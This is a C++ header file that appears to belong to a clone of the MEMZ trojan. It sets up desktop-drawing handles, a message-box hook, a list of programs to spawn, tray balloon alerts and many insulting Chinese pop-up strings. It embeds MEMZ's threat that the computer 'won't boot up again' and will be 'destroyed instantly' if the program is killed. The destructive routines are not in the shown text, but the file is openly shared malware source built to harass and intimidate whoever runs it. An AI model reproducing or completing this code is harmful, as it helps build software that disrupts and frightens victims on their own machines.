#pragma once
#include<Windows.h>
#include<iostream>
#include <imm.h>
#include "winres.h"
#pragma comment (lib ,"imm32.lib")
using namespace std;
//#include<iostream>

#define MAX_SOUNDS 3
#define MAX_EXECUTE 10
#define WM_TRAY (WM_USER + 100)
#define IDI_TRAY	 0
#define MB_ICONJISHI L"C:\\Users\\KSJ\\Desktop\\jishi.ico"

int cx = GetSystemMetrics(SM_CXSCREEN);
int cy = GetSystemMetrics(SM_CYSCREEN);
int ix = GetSystemMetrics(SM_CXICON) / 2;
int iy = GetSystemMetrics(SM_CYICON) / 2;
int times = 0;
int cursor_freq = 0;
bool once = true;
int shell_num = IDI_TRAY;

const unsigned char msgboxmsg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D\n\r\n\r";
int msg_len = sizeof(msgboxmsg);
TCHAR szStr[] = TEXT("憨包憨包！");

HCRYPTPROV prov;
HWND hwnd = GetDesktopWindow();
HDC hdc = GetWindowDC(hwnd);
HDC paint;
HDC hcdc = CreateCompatibleDC(hdc);
LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
POINT cursor;
HANDLE hThread;
DWORD ThreadID;
HHOOK hook;
RECT rekt;
DWORD wd;
INPUT Input;
NOTIFYICONDATA nid;
HANDLE hShellThread;
HINSTANCE hShell32 = LoadLibrary(L"shell32.dll");
HBRUSH hBrush;
HMONITOR hMonitor = MonitorFromWindow(hwnd, MONITOR_DEFAULTTONEAREST);
MONITORINFOEX miex;

WNDCLASSEX wnd;
TCHAR szCLassName[] = TEXT("老六!");
TCHAR szAppName[] = TEXT("我来！！！");
MSG msg;


LPCWSTR lpSoundsName[MAX_SOUNDS] = {
    L"SystemHand",
    L"SystemQuestion",
    L"SystemExclamation"
};

LPCWSTR lpExecuteName[MAX_EXECUTE] = {
    L"cmd",
    L"calc",
    //L"explorer",
    L"write",
    L"taskmgr",
    L"notepad"
};

int Shell32_Icon[16] = {
    3,
    6,
    9,
    14,
    15,
    17,
    24,
    25,
    32,
    237,
    236,
    238,
    269,
    275,
    16747,
    16783
};

LPCWSTR Info[6] = {
    L"好的,鸡屎ヾ(≧▽≦*)o",
    L"前方高能预警!!!!!!!!!!!!!!!!!!!w(ﾟДﾟ)w",
    L"嗨嗨嗨，来了奥!!(^人^)",
    L"这不是摇摆羊吗?^_~",
    L"几天不见，这么拉了?!o((⊙﹏⊙))o.",
    L"所有答辩都将入口即化!(＠_＠;)"
};

LPCWSTR Tip[6] = {
    L"电脑汐了!（；´д｀）ゞ",
    L"你妈让你趋势!q(≧▽≦q)",
    L"我是老六!(￣y▽,￣)╭ ",
    L"鸡丁大喽！(╬▔皿▔)╯",
    L"你啊爹叫你吃**ヾ(•ω•`)o",
    L"狗喽，个乌龟!o(≧口≦)o"
};

DWORD NIFICON[3] = {
    NIIF_ERROR,
    NIIF_WARNING,
    NIIF_INFO
};

double DPI(HWND hWnd)
{
    miex.cbSize = sizeof(miex);
    GetMonitorInfo(hMonitor, &miex);
    int cxLogical = (miex.rcMonitor.right - miex.rcMonitor.left);
    int cyLogical = (miex.rcMonitor.bottom - miex.rcMonitor.top);

    // 获取监视器物理宽度与高度
    DEVMODE dm;
    dm.dmSize = sizeof(dm);
    dm.dmDriverExtra = 0;
    EnumDisplaySettings(miex.szDevice, ENUM_CURRENT_SETTINGS, &dm);
    int cxPhysical = dm.dmPelsWidth;
    int cyPhysical = dm.dmPelsHeight;

    //缩放比例计算
    double horzScale = ((double)cxPhysical / (double)cxLogical);
    double vertScale = ((double)cyPhysical / (double)cyLogical);

    double Scale2 = horzScale + vertScale;
    
    double Scale = Scale2/ 2;

    return Scale;
}

LPCWSTR MsgBoxContent[11] = {
    L"荔枝",
    L"快点给我变成鸟",
    L"你家有乌龟",
    L"鸡公飞喽!"
    L"好的，你个咪狗",
    L"114514",
    L"哼，哼，啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊！！！！！！！！！！！！！"
    L"一群烂走狗",
    L"鸡丁丑陋（臭喽）",
    L"勾喽",
    L"你爹让你趋势",
    L"你啊妈让你去找杰哥"
};